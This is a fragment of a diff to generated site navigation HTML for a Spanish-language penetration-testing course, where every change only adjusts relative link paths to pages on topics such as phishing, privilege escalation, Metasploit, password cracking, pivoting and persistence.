+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/04.-Intercepci%C3%B3n%2C%20manipulaci%C3%B3n%20y%20monitoriazaci%C3%B3n%20del%20tr%C3%A1fico/02.-Manipulaci%C3%B3n%20e%20inyecci%C3%B3n%20de%20tr%C3%A1fico/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4306,7 +4306,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/05.-Phishing/" class="md-nav__link ">
+            <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/05.-Phishing/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -4339,7 +4339,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/05.-Phishing/01.-Introducci%C3%B3n%20al%20phishing%20y%20sus%20tipos/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/05.-Phishing/01.-Introducci%C3%B3n%20al%20phishing%20y%20sus%20tipos/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4360,7 +4360,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/05.-Phishing/02.-Metodolog%C3%ADa%20de%20Phishing/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/05.-Phishing/02.-Metodolog%C3%ADa%20de%20Phishing/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4418,7 +4418,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/06.-Elevaci%C3%B3n%20de%20privilegios/" class="md-nav__link ">
+            <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/06.-Elevaci%C3%B3n%20de%20privilegios/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -4451,7 +4451,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/06.-Elevaci%C3%B3n%20de%20privilegios/01.-Introducci%C3%B3n%20a%20la%20elevaci%C3%B3n%20de%20privilegios/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/06.-Elevaci%C3%B3n%20de%20privilegios/01.-Introducci%C3%B3n%20a%20la%20elevaci%C3%B3n%20de%20privilegios/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4472,7 +4472,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/06.-Elevaci%C3%B3n%20de%20privilegios/02.-Elevaci%C3%B3n%20de%20privilegios%20en%20Linux/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/06.-Elevaci%C3%B3n%20de%20privilegios/02.-Elevaci%C3%B3n%20de%20privilegios%20en%20Linux/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4493,7 +4493,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/06.-Elevaci%C3%B3n%20de%20privilegios/03.-Elevaci%C3%B3n%20de%20privilegios%20en%20Windows/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/06.-Elevaci%C3%B3n%20de%20privilegios/03.-Elevaci%C3%B3n%20de%20privilegios%20en%20Windows/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4514,7 +4514,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/06.-Elevaci%C3%B3n%20de%20privilegios/04.-Herramientas%20de%20elevaci%C3%B3n%20de%20privilegios/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/06.-Elevaci%C3%B3n%20de%20privilegios/04.-Herramientas%20de%20elevaci%C3%B3n%20de%20privilegios/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4582,7 +4582,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/" class="md-nav__link ">
+            <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -4615,7 +4615,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Contexto/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Contexto/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4636,7 +4636,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Pr%C3%A1ctica%2001.-Fase%20de%20reconocimiento/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Pr%C3%A1ctica%2001.-Fase%20de%20reconocimiento/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4657,7 +4657,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Pr%C3%A1ctica%2002.-Instalaci%C3%B3n%20del%20Laboratorio%20con%20KVM%E2%81%84QEMU/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Pr%C3%A1ctica%2002.-Instalaci%C3%B3n%20del%20Laboratorio%20con%20KVM%E2%81%84QEMU/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4678,7 +4678,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Pr%C3%A1ctica%2003.-Fase%20de%20Escaneo/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Pr%C3%A1ctica%2003.-Fase%20de%20Escaneo/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4699,7 +4699,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Pr%C3%A1ctica%2004.-Fase%20de%20Explotaci%C3%B3n%20con%20Metasploit/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Pr%C3%A1ctica%2004.-Fase%20de%20Explotaci%C3%B3n%20con%20Metasploit/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4720,7 +4720,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Solucion%20Practica%2001/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Solucion%20Practica%2001/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4741,7 +4741,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Solucion%20Practica%2002/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Solucion%20Practica%2002/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4762,7 +4762,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Solucion%20Practica%2003/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Solucion%20Practica%2003/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4783,7 +4783,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Solucion%20Practica%2004/" class="md-nav__link">
+      <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/07.-Pr%C3%A1cticas/Solucion%20Practica%2004/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4850,7 +4850,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/" class="md-nav__link ">
+            <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -4908,7 +4908,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/01.-Administraci%C3%B3n%20de%20sistemas%20de%20manera%20remota/" class="md-nav__link ">
+            <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/01.-Administraci%C3%B3n%20de%20sistemas%20de%20manera%20remota/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -4941,7 +4941,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/01.-Administraci%C3%B3n%20de%20sistemas%20de%20manera%20remota/01.-Introducci%C3%B3n%20a%20la%20administraci%C3%B3n%20de%20sistemas%20de%20manera%20remota/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/01.-Administraci%C3%B3n%20de%20sistemas%20de%20manera%20remota/01.-Introducci%C3%B3n%20a%20la%20administraci%C3%B3n%20de%20sistemas%20de%20manera%20remota/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -4962,7 +4962,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/01.-Administraci%C3%B3n%20de%20sistemas%20de%20manera%20remota/02.-Meterpreter/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/01.-Administraci%C3%B3n%20de%20sistemas%20de%20manera%20remota/02.-Meterpreter/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5020,7 +5020,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/02.-Ataques%20y%20auditor%C3%ADas%20de%20contrase%C3%B1as/" class="md-nav__link ">
+            <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/02.-Ataques%20y%20auditor%C3%ADas%20de%20contrase%C3%B1as/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -5053,7 +5053,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/02.-Ataques%20y%20auditor%C3%ADas%20de%20contrase%C3%B1as/01.-Tipos%20de%20ataques%20a%20contrase%C3%B1as/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/02.-Ataques%20y%20auditor%C3%ADas%20de%20contrase%C3%B1as/01.-Tipos%20de%20ataques%20a%20contrase%C3%B1as/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5074,7 +5074,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/02.-Ataques%20y%20auditor%C3%ADas%20de%20contrase%C3%B1as/02.-Password%20guessing/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/02.-Ataques%20y%20auditor%C3%ADas%20de%20contrase%C3%B1as/02.-Password%20guessing/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5095,7 +5095,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/02.-Ataques%20y%20auditor%C3%ADas%20de%20contrase%C3%B1as/03.-Password%20cracking/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/02.-Ataques%20y%20auditor%C3%ADas%20de%20contrase%C3%B1as/03.-Password%20cracking/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5116,7 +5116,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/02.-Ataques%20y%20auditor%C3%ADas%20de%20contrase%C3%B1as/04.-Otros%20ataques%20de%20contrase%C3%B1as/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/02.-Ataques%20y%20auditor%C3%ADas%20de%20contrase%C3%B1as/04.-Otros%20ataques%20de%20contrase%C3%B1as/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5174,7 +5174,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/03.-Pivotaje%20en%20la%20red/" class="md-nav__link ">
+            <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/03.-Pivotaje%20en%20la%20red/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -5207,7 +5207,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/03.-Pivotaje%20en%20la%20red/01.-Pivoting%20con%20SSH/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/03.-Pivotaje%20en%20la%20red/01.-Pivoting%20con%20SSH/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5228,7 +5228,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/03.-Pivotaje%20en%20la%20red/02.-Pivoting%20con%20meterpreter/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/03.-Pivotaje%20en%20la%20red/02.-Pivoting%20con%20meterpreter/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5249,7 +5249,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/03.-Pivotaje%20en%20la%20red/03.-Pivoting%20con%20http/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/03.-Pivotaje%20en%20la%20red/03.-Pivoting%20con%20http/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5270,7 +5270,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/03.-Pivotaje%20en%20la%20red/04.-Utilizando%20el%20proxy/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/03.-Pivotaje%20en%20la%20red/04.-Utilizando%20el%20proxy/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5324,7 +5324,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/04.-Instalaci%C3%B3n%20de%20puertas%20traseras/" class="md-nav__link ">
+            <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/04.-Instalaci%C3%B3n%20de%20puertas%20traseras/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -5357,7 +5357,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/04.-Instalaci%C3%B3n%20de%20puertas%20traseras/01.-Introducci%C3%B3n%20a%20la%20persistencia/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/04.-Instalaci%C3%B3n%20de%20puertas%20traseras/01.-Introducci%C3%B3n%20a%20la%20persistencia/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5378,7 +5378,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/04.-Instalaci%C3%B3n%20de%20puertas%20traseras/02.-Tipos%20de%20persistencia/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/04.-Instalaci%C3%B3n%20de%20puertas%20traseras/02.-Tipos%20de%20persistencia/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5440,7 +5440,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/" class="md-nav__link ">
+            <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -5473,7 +5473,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Contexto/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Contexto/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5494,7 +5494,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Pr%C3%A1ctica%2001.-Proceso%20de%20cracking%20de%20contrase%C3%B1as/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Pr%C3%A1ctica%2001.-Proceso%20de%20cracking%20de%20contrase%C3%B1as/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5515,7 +5515,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Pr%C3%A1ctica%2002.-Instalaci%C3%B3n%20del%20Laboratorio/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Pr%C3%A1ctica%2002.-Instalaci%C3%B3n%20del%20Laboratorio/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5536,7 +5536,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Pr%C3%A1ctica%2003.-Explotaci%C3%B3n%20de%20vulnerabilidad%20y%20configuraci%C3%B3n%20del%20servidor%20C2/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Pr%C3%A1ctica%2003.-Explotaci%C3%B3n%20de%20vulnerabilidad%20y%20configuraci%C3%B3n%20del%20servidor%20C2/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5557,7 +5557,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Pr%C3%A1ctica%2004.-Ejecuci%C3%B3n%20de%20la%20persistencia/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Pr%C3%A1ctica%2004.-Ejecuci%C3%B3n%20de%20la%20persistencia/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5622,7 +5622,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Soluci%C3%B3n%20Pr%C3%A1ctica%2001/01.-Preparaci%C3%B3n%20del%20Diccionario/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Soluci%C3%B3n%20Pr%C3%A1ctica%2001/01.-Preparaci%C3%B3n%20del%20Diccionario/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5643,7 +5643,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Soluci%C3%B3n%20Pr%C3%A1ctica%2001/02.-Descifrado%20de%20Hashes%20con%20Hashcat/" class="md-nav__link">
+      <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/05.-Pr%C3%A1cticas/Soluci%C3%B3n%20Pr%C3%A1ctica%2001/02.-Descifrado%20de%20Hashes%20con%20Hashcat/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5723,7 +5723,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../" class="md-nav__link ">
+            <a href="../../" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -5787,7 +5787,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/" class="md-nav__link ">
+            <a href="../../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -5820,7 +5820,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/01.-Arquitectura%20de%20una%20aplicativo%20web/" class="md-nav__link">
+      <a href="../../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/01.-Arquitectura%20de%20una%20aplicativo%20web/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5841,7 +5841,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/02.-Introducci%C3%B3n%20al%20protocolo%20de%20comunicaciones%20HTTP/" class="md-nav__link">
+      <a href="../../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/02.-Introducci%C3%B3n%20al%20protocolo%20de%20comunicaciones%20HTTP/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5862,7 +5862,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/03.-An%C3%A1lisis%20de%20la%20petici%C3%B3n%20HTTP/" class="md-nav__link">
+      <a href="../../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/03.-An%C3%A1lisis%20de%20la%20petici%C3%B3n%20HTTP/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5883,7 +5883,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/04.-An%C3%A1lisis%20de%20la%20respuesta%20HTTP/" class="md-nav__link">
+      <a href="../../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/04.-An%C3%A1lisis%20de%20la%20respuesta%20HTTP/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5904,7 +5904,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/05.-Tipos%20de%20autenticaci%C3%B3n%20web/" class="md-nav__link">
+      <a href="../../01.-Introducci%C3%B3n%20al%20protocolo%20HTTP/05.-Tipos%20de%20autenticaci%C3%B3n%20web/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -5958,7 +5958,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../02.-Recolecci%C3%B3n%20de%20informaci%C3%B3n/" class="md-nav__link ">
+            <a href="../../02.-Recolecci%C3%B3n%20de%20informaci%C3%B3n/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -5991,7 +5991,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../02.-Recolecci%C3%B3n%20de%20informaci%C3%B3n/01.-Pruebas%20de%20recolecci%C3%B3n%20de%20informaci%C3%B3n/" class="md-nav__link">
+      <a href="../../02.-Recolecci%C3%B3n%20de%20informaci%C3%B3n/01.-Pruebas%20de%20recolecci%C3%B3n%20de%20informaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6012,7 +6012,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../02.-Recolecci%C3%B3n%20de%20informaci%C3%B3n/02.-Herramientas%20de%20recolecci%C3%B3n%20de%20informaci%C3%B3n/" class="md-nav__link">
+      <a href="../../02.-Recolecci%C3%B3n%20de%20informaci%C3%B3n/02.-Herramientas%20de%20recolecci%C3%B3n%20de%20informaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6070,7 +6070,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../03.-An%C3%A1lisis%20de%20tr%C3%A1fico%20mediante%20proxies%20de%20interceptaci%C3%B3n/" class="md-nav__link ">
+            <a href="../../03.-An%C3%A1lisis%20de%20tr%C3%A1fico%20mediante%20proxies%20de%20interceptaci%C3%B3n/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -6103,7 +6103,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../03.-An%C3%A1lisis%20de%20tr%C3%A1fico%20mediante%20proxies%20de%20interceptaci%C3%B3n/01.-Introducci%C3%B3n%20a%20los%20proxies%20de%20interceptaci%C3%B3n/" class="md-nav__link">
+      <a href="../../03.-An%C3%A1lisis%20de%20tr%C3%A1fico%20mediante%20proxies%20de%20interceptaci%C3%B3n/01.-Introducci%C3%B3n%20a%20los%20proxies%20de%20interceptaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6124,7 +6124,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../03.-An%C3%A1lisis%20de%20tr%C3%A1fico%20mediante%20proxies%20de%20interceptaci%C3%B3n/02.-OWASP%20ZAP%20proxy/" class="md-nav__link">
+      <a href="../../03.-An%C3%A1lisis%20de%20tr%C3%A1fico%20mediante%20proxies%20de%20interceptaci%C3%B3n/02.-OWASP%20ZAP%20proxy/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6145,7 +6145,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../03.-An%C3%A1lisis%20de%20tr%C3%A1fico%20mediante%20proxies%20de%20interceptaci%C3%B3n/03.-Burp%20Suite%20proxy/" class="md-nav__link">
+      <a href="../../03.-An%C3%A1lisis%20de%20tr%C3%A1fico%20mediante%20proxies%20de%20interceptaci%C3%B3n/03.-Burp%20Suite%20proxy/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6166,7 +6166,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../03.-An%C3%A1lisis%20de%20tr%C3%A1fico%20mediante%20proxies%20de%20interceptaci%C3%B3n/04.-Automatizaci%C3%B3n%20de%20conexiones%20a%20servidores%20web%20con%20BurpSuite/" class="md-nav__link">
+      <a href="../../03.-An%C3%A1lisis%20de%20tr%C3%A1fico%20mediante%20proxies%20de%20interceptaci%C3%B3n/04.-Automatizaci%C3%B3n%20de%20conexiones%20a%20servidores%20web%20con%20BurpSuite/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -6234,7 +6234,7 @@
           
           
